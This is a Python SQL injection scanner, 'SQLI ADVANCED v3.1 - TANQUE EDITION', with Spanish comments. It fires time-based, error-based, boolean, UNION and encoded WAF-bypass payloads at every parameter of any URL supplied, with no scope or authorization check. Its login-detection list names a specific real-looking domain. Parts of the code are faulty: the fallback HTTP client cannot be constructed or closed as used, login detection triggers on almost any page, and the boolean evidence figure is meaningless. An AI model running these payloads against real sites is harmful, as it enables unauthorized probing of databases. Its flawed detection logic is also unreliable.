#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQLI ADVANCED v3.1 - TANQUE EDITION - ANTI FALSOS POSITIVOS
Bug Bounty Ready · Zero False Positives · WAF Bypass · Blind SQLi
AHORA CON DETECCIÓN DE PÁGINAS DE LOGIN Y REDIRECCIONES
"""

import aiohttp
import asyncio
import re
import sys
import time
import random
from urllib.parse import urlparse, urljoin, quote
from typing import Dict, List, Optional, Tuple
from datetime import datetime
import statistics

# Importar http_client TANQUE
try:
    from http_client import HTTPClient
except ImportError:
    # Fallback si no existe
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url, **kwargs): return None
        async def post(self, url, **kwargs): return None

class SQLIAdvanced:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.findings = []
        self.client = None

        # Estadísticas para time-based
        self.baseline_times = []
        self.time_threshold = 3.0

        # Payloads priorizados por efectividad
        self.priority_payloads = [
            # Time-based (más fiables)
            ("' AND SLEEP(5)--", "mysql", "time_sleep", 10),
            ("' AND 1=(SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000))--", "postgresql", "time_heavy", 9),
            ("'; WAITFOR DELAY '0:0:5'--", "mssql", "time_delay", 10),
            ("' AND 1=1 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM DUAL)--", "oracle", "time_pipe", 9),

            # Error-based (rápidos)
            ("'", "mysql", "error_generic", 8),
            ("\"", "mysql", "error_quote", 8),
            ("' AND 1=1--", "mysql", "boolean_true", 7),
            ("' AND 1=2--", "mysql", "boolean_false", 7),

            # Union-based (cuando funcionan)
            ("' UNION SELECT NULL--", "mysql", "union_null", 6),
            ("' UNION SELECT 1,2,3--", "mysql", "union", 6),

            # WAF Bypass (cuando hay firewall)
            ("'/**/OR/**/'1'/**/='1", "mysql", "comment_bypass", 5),
            ("%2527%2520OR%2520%25271%2527%253D%25271", "mysql", "double_encode", 5),
        ]

        # Patrones de error por DB
        self.error_patterns = {
            'mysql': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"MySQLSyntaxErrorException",
                r"check the manual.*MySQL",
                r"Unknown column '.*' in 'field list'",
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR",
                r"Warning.*PostgreSQL",
                r"pg_query\(\)",
                r"ERROR:.*syntax error",
            ],
            'mssql': [
                r"Driver.*SQL Server",
                r"OLE DB.*SQL Server",
                r"Unclosed quotation mark",
                r"Microsoft.*SQL Server.*error",
            ],
            'oracle': [
                r"ORA-[0-9]{5}",
                r"Oracle.*Driver",
                r"Oracle.*error",
            ],
        }

        # ============ NUEVOS PATRONES ANTI FALSOS POSITIVOS ============
        self.login_indicators = [
            'login', 'signin', 'microsoftonline', 'oauth',
            'authorize', 'sso', 'identity', 'account/signin',
            'login.microsoft', 'login.windows', 'sts.delen.be',
            'account/login', 'user/login', 'auth/login',
        ]

        self.login_phrases = [
            'sign in', 'log in', 'login', 'signin', 'authentication required',
            'please sign in', 'please log in', 'iniciar sesión', 'acceder',
            'username', 'password', 'contraseña', 'usuario',
            'forgot password', 'reset password', 'remember me',
        ]

        self.redirect_codes = [301, 302, 303, 307, 308]

    async def setup(self):
        """Inicializa cliente HTTP tanque"""
        self.client = HTTPClient(timeout=15, max_retries=3)

    # ============ NUEVAS FUNCIONES ANTI FALSOS POSITIVOS ============
    def is_login_page(self, text: str, url: str, status: int = 200) -> bool:
        """Detecta si la respuesta es una página de login"""
        text_lower = text.lower()
        url_lower = url.lower()

        # Verificar indicadores en URL
        for indicator in self.login_indicators:
            if indicator in url_lower:
                return True

        # Verificar indicadores en contenido
        for phrase in self.login_phrases:
            if phrase in text_lower:
                return True

        # Detectar formularios de login
        if '<form' in text_lower and ('password' in text_lower or 'contraseña' in text_lower):
            # Verificar que tenga campos de usuario/contraseña
            if ('input' in text_lower and 'type="password"' in text_lower):
                return True

        return False

    def is_redirect_to_login(self, resp) -> bool:
        """Detecta si la respuesta redirige a una página de login"""
        if resp.status in self.redirect_codes:
            location = resp.headers.get('location', '')
            for indicator in self.login_indicators:
                if indicator in location.lower():
                    return True
        return False

    async def get_stable_response(self, url: str) -> Dict:
        """Obtiene una respuesta estable, siguiendo redirecciones si es necesario"""
        try:
            resp = await self.client.get(url, allow_redirects=True)
            if not resp:
                return {'status': 0, 'text': '', 'url': url, 'is_login': False}

            text = await resp.text()
            final_url = str(resp.url)

            # Verificar si es login
            is_login = self.is_login_page(text, final_url, resp.status)

            return {
                'status': resp.status,
                'text': text,
                'url': final_url,
                'is_login': is_login,
                'headers': resp.headers
            }
        except Exception as e:
            return {'status': 0, 'text': '', 'url': url, 'is_login': False, 'error': str(e)}

    async def measure_baseline(self, url: str, param: str) -> Dict:
        """Mide tiempos baseline para detección time-based"""
        times = []
        responses = []
        login_detected = False
        login_url = None

        clean_url = url.replace(f"{param}=test", f"{param}=1")

        for i in range(5):
            try:
                start = time.time()
                resp = await self.client.get(clean_url, allow_redirects=True)
                if resp:
                    elapsed = time.time() - start
                    times.append(elapsed)
                    text = await resp.text()
                    final_url = str(resp.url)

                    # Detectar si es página de login o redirección
                    if self.is_login_page(text, final_url, resp.status):
                        login_detected = True
                        login_url = final_url
                    elif self.is_redirect_to_login(resp):
                        login_detected = True
                        login_url = resp.headers.get('location', '')

                    responses.append({
                        'length': len(text),
                        'status': resp.status,
                        'time': elapsed,
                        'url': final_url
                    })
                await asyncio.sleep(0.5)
            except:
                pass

        if login_detected:
            return {
                'is_login': True,
                'login_url': login_url or clean_url,
                'avg_time': sum(times)/len(times) if times else 0.5,
                'threshold': (sum(times)/len(times) + 1.0) if times else 1.5,
                'samples': len(times)
            }

        if times:
            avg_time = statistics.mean(times)
            std_time = statistics.stdev(times) if len(times) > 1 else 0.1
            self.baseline_times = times
            self.time_threshold = avg_time + (std_time * 3)

            return {
                'avg_time': avg_time,
                'std_time': std_time,
                'threshold': self.time_threshold,
                'samples': len(times),
                'is_login': False
            }
        return {'avg_time': 0.5, 'threshold': 2.0, 'is_login': False}

    async def test_payload(self, url: str, param: str, payload: Tuple) -> Optional[Dict]:
        """Prueba un payload con verificación en dos fases"""
        payload_str, db_type, payload_name, priority = payload

        try:
            # Construir URL
            if '?' in url:
                test_url = url.replace(f"{param}=", f"{param}={quote(payload_str)}")
            else:
                test_url = f"{url}?{param}={quote(payload_str)}"

            start = time.time()
            resp = await self.client.get(test_url, allow_redirects=True)
            elapsed = time.time() - start

            if not resp:
                return None

            text = await resp.text()
            final_url = str(resp.url)

            # ============ NUEVO: Detectar si es página de login ============
            if self.is_login_page(text, final_url, resp.status):
                return {
                    'type': 'LOGIN_PAGE',
                    'url': test_url,
                    'final_url': final_url,
                    'payload_name': payload_name,
                    'note': 'Redirige a login - probable falso positivo'
                }

            if self.is_redirect_to_login(resp):
                return {
                    'type': 'LOGIN_REDIRECT',
                    'url': test_url,
                    'location': resp.headers.get('location', ''),
                    'payload_name': payload_name,
                    'note': 'Redirige a login - probable falso positivo'
                }

            # 1. Detección por error
            detected_db = None
            for db, patterns in self.error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, text, re.IGNORECASE):
                        detected_db = db
                        break

            # 2. Time-based detection
            time_based = False
            if 'time' in payload_name and elapsed > self.time_threshold:
                # Verificar que no sea falso positivo (segunda petición)
                await asyncio.sleep(1)
                start2 = time.time()
                resp2 = await self.client.get(test_url, allow_redirects=True)
                elapsed2 = time.time() - start2

                if elapsed2 > self.time_threshold:
                    # Verificar que la segunda respuesta no sea login
                    if resp2:
                        text2 = await resp2.text()
                        if not self.is_login_page(text2, str(resp2.url)):
                            time_based = True

            # 3. Boolean-based
            boolean_diff = False
            if 'boolean' in payload_name:
                # Comparar con baseline
                true_url = url.replace(f"{param}=", f"{param}=1' AND 1=1--")
                false_url = url.replace(f"{param}=", f"{param}=1' AND 1=2--")

                resp_true = await self.client.get(true_url, allow_redirects=True)
                resp_false = await self.client.get(false_url, allow_redirects=True)

                if resp_true and resp_false:
                    text_true = await resp_true.text()
                    text_false = await resp_false.text()

                    # Verificar que ninguna sea login
                    if (not self.is_login_page(text_true, str(resp_true.url)) and
                        not self.is_login_page(text_false, str(resp_false.url))):

                        if abs(len(text_true) - len(text_false)) > 100:
                            boolean_diff = True

            if detected_db or time_based or boolean_diff:
                severity = 'CRITICO'
                if time_based:
                    evidence = f"Time-based: {elapsed:.2f}s (threshold: {self.time_threshold:.2f}s)"
                elif detected_db:
                    evidence = f"Error-based: {detected_db}"
                else:
                    evidence = f"Boolean-based diff: {abs(len(text) - 500)} chars"

                return {
                    'type': 'SQL Injection',
                    'db_type': detected_db or 'unknown',
                    'payload_name': payload_name,
                    'payload': payload_str,
                    'param': param,
                    'url': test_url,
                    'time': round(elapsed, 2),
                    'evidence': evidence,
                    'severity': severity,
                    'priority': priority
                }

        except Exception as e:
            pass
        return None

    async def extract_params(self) -> List[str]:
        """Extrae parámetros de la URL"""
        params = []

        # De la URL
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])

        # Parámetros comunes si no hay
        if not params:
            params = ['id', 'user', 'username', 'name', 'q', 'search',
                     'page', 'sort', 'order', 'cat', 'category']

        return list(set(params))

    async def scan(self):
        """Ejecuta escaneo completo"""
        print(f"\n[SQLi] SQLI ADVANCED TANQUE - {self.url}")
        print("=" * 60)

        await self.setup()

        try:
            # Extraer parámetros
            params = await self.extract_params()
            print(f"[*] Probando {len(params)} parámetros")

            login_detected_global = False

            for param in params:
                print(f"\n[*] Parámetro: {param}")

                # Medir baseline
                baseline = await self.measure_baseline(self.url, param)

                # ============ NUEVO: Si detecta login, saltar ============
                if baseline.get('is_login'):
                    print(f"    [WARN]  Detectada página de login: {baseline.get('login_url')}")
                    print(f"    [WARN]  Saltando pruebas (probable falso positivo)")
                    self.findings.append({
                        'type': 'LOGIN_REDIRECT',
                        'param': param,
                        'login_url': baseline.get('login_url'),
                        'note': 'El sitio redirige a login - las diferencias son falsos positivos'
                    })
                    login_detected_global = True
                    continue

                print(f"    Baseline: {baseline.get('avg_time', 0):.2f}s (threshold: {baseline.get('threshold', 2):.2f}s)")

                # Probar payloads por prioridad
                for payload in sorted(self.priority_payloads, key=lambda x: x[3], reverse=True):
                    # Rate limiting
                    await asyncio.sleep(random.uniform(0.5, 1.5))

                    result = await self.test_payload(self.url, param, payload)

                    if result:
                        self.findings.append(result)

                        # Si es LOGIN_PAGE o LOGIN_REDIRECT, mostrar advertencia
                        if result.get('type') in ['LOGIN_PAGE', 'LOGIN_REDIRECT']:
                            print(f"    [WARN]  {result['note']}")
                            login_detected_global = True
                        elif result['severity'] == 'CRITICO':
                            print(f"    [[CRITICO]] {result['payload_name']}")
                            print(f"         ↳ DB: {result['db_type']}")
                            print(f"         ↳ {result['evidence']}")

                            # Si es crítico, no seguir probando este parámetro
                            if result.get('priority', 0) >= 8:
                                break

            # Mostrar resumen
            print("\n" + "="*60)
            print("📊 RESULTADOS FINALES")
            print("="*60)

            if login_detected_global:
                print("\n[WARN]  SE DETECTARON PÁGINAS DE LOGIN")
                print("   Los hallazgos pueden ser falsos positivos")
                print("   Se recomienda ejecutar con una sesión autenticada")

            sql_findings = [f for f in self.findings if f['type'] == 'SQL Injection']
            if sql_findings:
                criticos = [f for f in sql_findings if f['severity'] == 'CRITICO']
                print(f"\n[CRITICO] CRÍTICOS: {len(criticos)}")
                for f in criticos[:5]:
                    print(f"   • {f['param']}: {f['payload_name']} ({f['db_type']})")
                print(f"\n[OK] Total SQLi: {len(sql_findings)}")
            else:
                print("\n[OK] No se detectaron inyecciones SQL reales")

            # Mostrar advertencia final si solo hubo logins
            if login_detected_global and not sql_findings:
                print("\n[INFO] NOTA: Todas las alertas eran redirecciones a login")
                print("   Esto es normal en sitios que requieren autenticación")

        finally:
            if self.client:
                await self.client.close()

        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 sqli_advanced.py <URL>")
        sys.exit(1)

    scanner = SQLIAdvanced(sys.argv[1])
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
